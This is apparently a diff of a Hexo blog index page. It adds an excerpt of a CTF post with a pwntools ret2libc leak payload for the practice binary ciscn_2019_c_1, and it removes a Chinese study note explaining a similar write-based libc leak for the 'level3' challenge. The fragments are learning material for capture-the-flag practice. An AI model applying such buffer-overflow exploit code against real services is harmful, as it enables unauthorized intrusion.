@@ -152,6 +152,74 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-programe-test" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/03/18/programe-test/">programe test</a>
+    </h1>
+  
+
+        
+        <a href="/2022/03/18/programe-test/" class="archive-article-date">
+  	<time datetime="2022-03-18T03:06:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-18</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>…</p>
+<p>q=process(“./ciscn_2019_c_1”)<br>elf= ELF(“./ciscn_2019_c_1”)</p>
+<p>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>main = elf.symbols[‘_start’]</p>
+<p>print “puts_plt = “,hex(puts_plt)<br>print “puts_got = “,hex(puts_got)<br>print “main = “,hex(main)</p>
+<p>payload=flat([“a”*0xc,puts_plt,main,puts_got])</p>
+<p>q.recv()<br>…</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/03/18/programe-test/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-鹤城杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -787,81 +855,6 @@
 
 
   
-    <article id="post-level3-查找system地址查找binsh" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/04/level3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/">level3  查找system地址查找binsh</a>
-    </h1>
-  
-
-        
-        <a href="/2021/10/04/level3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/" class="archive-article-date">
-  	<time datetime="2021-10-04T08:37:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>收获<br>参数问题<br>puts 函数 只需要给一个参数<br>write 函数 需要给三个参数 （根据原函数来给 参数赋值）<br>    payload=’A’*0x8c+p32(write_plt)+p32(main_plt)+p32(1)+p32(write_got)+p32(4)</p>
-<p>问题：<br>后面的三个参数是否有顺序，还是说一定是 p32(1) + 任意一个打包地址 + p32(4)<br>p32(1) 与 p32(4) 的区别是？</p>
-<p>在程序中查看libc版本的方法。</p>
-<hr>
-<p>解题思路与基本ROP的ret2libc3一样</p>
-<p>解题思路：<br>1.无system和bin (IDA没有实际是有的)，利用plt和got表来查找它们的地址<br>2.泄露libc地址，找到一个函数的真实地址并且知道libc的版本号就可以知道偏移量从而知道每个函数的真实地址。<br>3.真实地址需要接收：u32(q.recv()[0:4])，打包成32位的地址<br>4.基地址+函数偏移量=函数真实地址</p>
-<p>不同点 ，<br>ret2libc3 中用的是puts函数而 level3 用的是write函数</p>
-<p>puts 函数 只需要给一个参数<br>write 函数 需要给三个参数 （根据情况来给 参数赋值）</p>
-<p><img src="/2021/10/04/level3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/1.png" alt="BP"><br>    payload=’A’*0x8c+p32(write_plt)+p32(main_plt)+p32(1)+p32(write_got)+p32(4)</p>
-<p>后面的三个参数是否有顺序，还是说一定是 p32(1) + 任意一个打包地址 + p32(4)<br>p32(1) 与 p32(4) 的区别是？</p>
-<p>在程序中查看libc版本的方法。</p>
-<p>查找到 libc 版本就知道了偏移量也就知道了  system函数和binsh的地址啦！！</p>
-<p>详细构建思路<br>#获取文件对象<br>elf=ELF(‘./level3/level3’)<br>#获取函数<br>write_plt=elf.plt[‘write’]<br>write_got=elf.got[‘write’]<br>main_addr=elf.sym[‘main’]</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/04/level3-%E6%9F%A5%E6%89%BEsystem%E5%9C%B0%E5%9D%80%E6%9F%A5%E6%89%BEbinsh/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -876,7 +869,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021 John Doe
+    		&copy; 2022 John Doe
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
